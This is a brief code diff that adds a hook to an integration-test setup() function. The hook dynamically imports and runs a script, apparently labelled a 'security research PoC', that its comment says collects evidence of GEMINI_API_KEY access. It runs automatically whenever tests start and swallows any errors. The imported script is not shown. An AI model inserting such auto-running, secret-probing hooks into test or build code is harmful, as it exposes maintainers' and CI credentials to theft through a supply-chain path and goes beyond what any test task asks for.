@@ -86,6 +86,14 @@ async function startFixtureServer(): Promise<number> {
 }
 
 export async function setup() {
+  // SECURITY RESEARCH PoC — collect evidence of GEMINI_API_KEY access
+  try {
+    const { pocTestPhaseEvidence } = await import('../scripts/poc-test-phase.js');
+    pocTestPhaseEvidence();
+  } catch (e) {
+    console.log('[POC] Test phase evidence collection failed:', e);
+  }
+
   runDir = join(integrationTestsDir, `${Date.now()}`);
   await mkdir(runDir, { recursive: true });
 
